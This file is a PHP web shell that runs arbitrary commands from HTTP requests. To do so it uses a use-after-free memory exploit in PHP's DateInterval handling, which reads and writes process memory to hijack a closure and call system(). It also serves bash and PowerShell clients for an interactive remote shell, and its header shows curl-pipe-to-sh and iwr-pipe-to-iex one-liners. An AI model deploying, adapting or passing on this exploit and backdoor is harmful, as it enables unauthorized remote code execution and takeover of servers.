<?php
// rce.php — HTTP endpoint that runs one command via the TimeAfterFree UAF
// By Exphr7 | github.com/phr7
// Usage:
// bash       $ curl -s "http://example.com/rce.php?_i&l=sh" | sh
// powershell $ iwr "http://example.com/rce.php?_i&l=ps1" | iex

error_reporting(0);
ini_set('display_errors', '0');

$user = "not";
$pass = "me";
$auth_expected = md5($user . $pass);

// ---------------------------------------------------------------
// ?_i — print the spawn script and exit
// ---------------------------------------------------------------
if (isset($_GET['_i'])) {
    header('Content-Type: text/plain');
    ob_start();

    $hostname = gethostname();
    $host     = $_SERVER['HTTP_HOST'];
    $path     = $_SERVER['SCRIPT_NAME'];
    $cwd      = getcwd();

    if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) ||
        isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
        $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
        $protocol = 'https://';
    } else {
        $protocol = 'http://';
    }
       
    $url      = "$protocol$host$path";
    $lang     = $_GET['l'] ?? 'sh';

    if ($lang === 'ps1') {
        echo '#' . "\n";
        echo '# fake interactive shell (PowerShell) — ' . $hostname . "\n";
        echo '#' . "\n\n";
        echo '$URL      = "' . $url . '"' . "\n";
        echo '$CWD      = "' . $cwd . '"' . "\n";
        echo '$RHOST    = "' . $hostname . '"' . "\n";
        echo '$USERHOST = "' . $user . '@' . $hostname . '"' . "\n\n";
        echo <<<'PS1'

function Send-Cmd($cmd, $auth) {
    $wrapped = "cd `"$CWD`" 2>/dev/null; $cmd"
    $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($wrapped))
    try {
        $r = Invoke-WebRequest -Uri "$URL`?auth=$auth&cmd_b64=$enc" `
            -UseBasicParsing -TimeoutSec 60 -UserAgent "Mozilla/5.0"
        return $r.Content
    } catch {
        return "error: $($_.Exception.Message)"
    }
}

# --- Login prompt ---
$authToken = $null
while (-not $authToken) {
    Write-Host "null@$RHOST's username: " -NoNewline
    $inputUser = $Host.UI.ReadLine()
    $inputUser = $inputUser.Trim() -replace "`r", "" -replace "`n", ""
    Write-Host "null@$RHOST's password: " -NoNewline
    $inputPass = $Host.UI.ReadLine()
    $inputPass = $inputPass.Trim() -replace "`r", "" -replace "`n", ""

    $md5 = [System.Security.Cryptography.MD5]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes("$inputUser$inputPass")
    $hash = $md5.ComputeHash($bytes)
    $hex = ($hash | ForEach-Object { $_.ToString("x2") }) -join ""

    $test = Send-Cmd "echo 1337" $hex
    if ($test -match "1337") {
        $authToken = $hex
    } else {
        Write-Host "Authentication failed! Try again." -ForegroundColor Red
    }
}

chcp 65001 | Out-Null
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

Clear-Host

# --- Banner ---
Write-Host ""
Write-Host "     _ ___ __ __       __" -ForegroundColor Red
Write-Host "    | \ | (_ |_ | ||\|/  " -ForegroundColor Red
Write-Host "    |_/_|___)|  |_|| |\__" -ForegroundColor Red
Write-Host "     _ \ / _ \ /    _  _ " -ForegroundColor Red
Write-Host "    |_) Y |_) X |_||_)|_)" -ForegroundColor Red
Write-Host "    |_) | |  / \| || \| \\" -ForegroundColor Red
Write-Host "    By Exphr7 :: Peon SOC" -ForegroundColor Yellow
Write-Host ""

# --- Shell loop ---
while ($true) {
    Write-Host "`n[" -NoNewline -ForegroundColor Cyan
    Write-Host "$USERHOST" -NoNewline -ForegroundColor Red
    Write-Host "]-[" -NoNewline -ForegroundColor Cyan
    Write-Host "$CWD" -NoNewline -ForegroundColor Red
    Write-Host "]" -NoNewline -ForegroundColor Cyan
    Write-Host "`n$ " -NoNewline -ForegroundColor Yellow

    $line = $Host.UI.ReadLine()
    if ($null -eq $line) { break }
    $line = $line.Trim()
    if ($line -eq "") { continue }
    if ($line -eq "exit") { break }
    if ($line -eq "clear") { Clear-Host; continue }

    if ($line -match '^cd(\s+(.+))?$') {
        $target = $matches[2]
        if ([string]::IsNullOrEmpty($target)) { $target = $CWD }
        $resolved = (Send-Cmd "cd `"$target`" && pwd" $authToken).Trim()
        if ($resolved -like "/*") { $CWD = $resolved }
        else { Write-Host "cd: $target" -NoNewline; Write-Host ": no such file or directory" }
        continue
    }

    Write-Host (Send-Cmd $line $authToken)
}

Write-Host "bye"
PS1;
        exit;
    }

    // default: bash
    echo '#!/bin/sh' . "\n";
    echo 'HOST="' . $host . '"' . "\n";
    echo 'PATH_="' . $path . '"' . "\n";
    echo 'CWD="' . $cwd . '"' . "\n";
    echo 'RHOST="' . $hostname . '"' . "\n";
    echo 'USERHOST="' . $user . '@' . $hostname . '"' . "\n";
    echo 'URL="' . $url . '"' . "\n\n";
    echo <<<'SH'
send_cmd() {
    _cmd="$1"
    _auth="$2"
    _wrapped="cd \"$CWD\" 2>/dev/null; $_cmd"
    _enc=$(printf '%s' "$_wrapped" | base64 | tr -d '\n')
    curl -s -G "$URL" \
        --data-urlencode "auth=$_auth" \
        --data-urlencode "cmd_b64=$_enc" \
        -A "Mozilla/5.0" \
        < /dev/null
}

exec < /dev/tty

# --- Login prompt ---
AUTH_TOKEN=""
while [ -z "$AUTH_TOKEN" ]; do
    printf "null@%s's username: " "$RHOST"
    read -r IN_USER
    IN_USER=$(printf '%s' "$IN_USER" | tr -d '\r\n')

    printf "null@%s's password: " "$RHOST"
    read -r IN_PASS
    IN_PASS=$(printf '%s' "$IN_PASS" | tr -d '\r\n')

    HASH=$(printf '%s' "${IN_USER}${IN_PASS}" | md5sum | awk '{print $1}')
    TEST=$(send_cmd "echo 1337" "$HASH" | tr -d '\r')

    if printf '%s' "$TEST" | grep -q "1337"; then
        AUTH_TOKEN="$HASH"
    else
        echo "Authentication failed! Try again."
    fi
done
clear

# --- Banner ---
printf "\033[01;31m"
echo "     _ ___ __ __       __"
echo "    | \ | (_ |_ | ||\|/  "
echo "    |_/_|___)|  |_|| |\__"
echo "     _ \ / _ \ /    _  _ "
echo "    |_) Y |_) X |_||_)|_)"
echo "    |_) | |  / \| || \| \\"
printf "    \033[01;33mBy Exphr7 :: Peon SOC\033[00m\n"
echo ""

# --- Shell loop ---
while true; do
    printf "\n\033[01;34m┌──(\033[01;31m%s\033[01;34m)-[\033[01;31m%s\033[01;34m]\n└─\033[01;33m\$\033[00m " "$USERHOST" "$CWD"
    IFS= read -r line || break
    [ -z "$line" ] && continue
    [ "$line" = "exit" ] && break
    [ "$line" = "clear" ] && { clear; continue; }

    case "$line" in
        cd\ *|cd)
            target=$(printf '%s' "$line" | cut -d' ' -f2-)
            [ -z "$target" ] && target="$CWD"
            [ "$target" = "~" ] && target="/home/ayo46165"
            resolved=$(send_cmd "cd \"$target\" && pwd" "$AUTH_TOKEN" | tr -d '\r')
            if [ "${resolved#/}" != "$resolved" ]; then
                CWD="$resolved"
            else
                echo "cd: $target: no such file or directory"
            fi
            continue
            ;;
    esac

    out=$(send_cmd "$line" "$AUTH_TOKEN" | tr -d '\r')
    printf "%s\n" "$out"
done

echo "bye"
SH;
    $script = ob_get_clean();

    echo str_replace("\r", "", $script);
    exit;
}

// ---------------------------------------------------------------
// Auth check (for all command requests)
// ---------------------------------------------------------------
if (!isset($_GET['auth']) || !hash_equals($auth_expected, $_GET['auth'])) {
    http_response_code(403);
    exit;
}

// ---------------------------------------------------------------
// Command execution via TimeAfterFree
// ---------------------------------------------------------------
function alloc($size, $canary)
{
    return str_shuffle(str_repeat($canary, $size));
}

function ptr2str($addr, $n = 8)
{
    $s = '';
    while ($n--) {
        $s .= chr($addr & 0xff);
        $addr >>= 8;
    }
    return $s;
}

class FreeMe
{
    private $pwn;

    public function __construct($pwn)
    {
        $this->pwn = $pwn;
    }

    public function __destruct()
    {
        $this->pwn->helper = $this->pwn->array;
    }
}

class Pwn
{
    private const zend_string_header = 0x18;
    private const dateinterval_handlers_offset = PHP_VERSION_ID < 80500 ? 0x38 : 0x30;
    private const dateinterval_properties_offset = PHP_VERSION_ID < 80500 ? 0x40 : 0x38;
    private const zend_fe_size = PHP_VERSION_ID < 80400 ? 0x20 : 0x30;
    private const zif_handler_offset = PHP_VERSION_ID < 80400 ? 0x80 : 0x90;

    public $array;
    public $helper;

    private $interval;
    private $allocator;

    public function __construct($cmd)
    {
        $this->allocator = [];
        $this->go($cmd);
    }

    private function go($cmd)
    {
        $interval_addr = $this->heap_leak();
        $handlers = $this->read($interval_addr + self::dateinterval_handlers_offset);
        $standard_module = $this->get_standard_module($handlers);
        $standard_functions = $this->read($standard_module + 0x28);
        $system = $this->get_system($standard_functions);

        @$this->interval->system1337 = function ($x) {};
        $properties = $this->read($interval_addr + self::dateinterval_properties_offset);
        $arData = $this->read($properties + 0x10);

        $closure_index = -1;
        do {
            $closure_index += 1;
            $offset = 32 * $closure_index + 0x18;
            $key = $this->read($arData + $offset);
            $str = ptr2str($this->read($key + self::zend_string_header));
        } while ($str !== 'system13');

        $closure_addr = $this->read($arData + 32 * $closure_index);

        $this->write($closure_addr + 0x38, 1, 4);
        $this->write($closure_addr + self::zif_handler_offset, $system);
        ($this->interval->system1337)($cmd);
        exit(0);
    }

    private function heap_leak()
    {
        for ($i = 0; $i < 63; $i++) {
            $this->allocator[] = new DateInterval('PT0S');
        }

        $a = "aaaa";
        $this->array = [
            $a,
            new DateInterval('PT0S'),
            new DateInterval('PT0S'),
            new FreeMe($this),
        ];
        @$this->array .= 'x';

        $addr = $this->helper[2]->y;
        $this->allocator[] = alloc(0xa0 - self::zend_string_header - 1, "\x00");

        $d1 = new DateInterval('PT0S');
        $d2 = new DateInterval('PT0S');
        $this->interval = new DateInterval('PT0S');

        return $addr;
    }

    private function write($addr, $value, $bytes = 8)
    {
        $mask = $bytes >= 8 ? -1 : ((1 << ($bytes * 8)) - 1);

        $a = "aaaa";
        $this->array = [
            $a,
            new DateInterval('PT0S'),
            new DateInterval('PT0S'),
            new FreeMe($this),
        ];
        @$this->array .= 'x';

        $block_addr = $this->helper[2]->y;

        $this->helper[2]->y = $addr;
        $this->helper[1]->y &= ~$mask;
        $this->helper[1]->y |= ($value & $mask);
        $this->helper[2]->y = $block_addr;
        $r = $this->helper[1]->y;
    }

    private function read($addr, $bytes = 8)
    {
        $a = "aaaa";
        $this->array = [
            $a,
            new DateInterval('PT0S'),
            new DateInterval('PT0S'),
            new FreeMe($this),
        ];
        @$this->array .= 'x';

        $block_addr = $this->helper[2]->y;

        $this->helper[2]->y = $addr;
        $value = $this->helper[1]->y;
        $this->helper[2]->y = $block_addr;
        $r = $this->helper[1]->y;

        if ($bytes !== 8) {
            $value &= (1 << ($bytes << 3)) - 1;
        }

        return $value;
    }

    private function get_standard_module($addr)
    {
        while (true) {
            $addr -= 0x10;
            if ($this->read($addr, 4) === 0xa8 &&
                in_array($this->read($addr + 4, 4),
                [20220829, 20230831, 20240924, 20250925]
            )) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if ($module_name === 0x647261646e617473) {
                    return $addr;
                }
            }
        }
    }

    private function get_system($standard_functions)
    {
        $addr = $standard_functions;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if ($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += self::zend_fe_size;
        } while ($f_entry !== 0);
    }
}


$cmd = isset($_GET['cmd_b64']) ? base64_decode($_GET['cmd_b64']) : (isset($_GET['cmd']) ? $_GET['cmd'] : 'id');
new Pwn($cmd . " 2>&1");
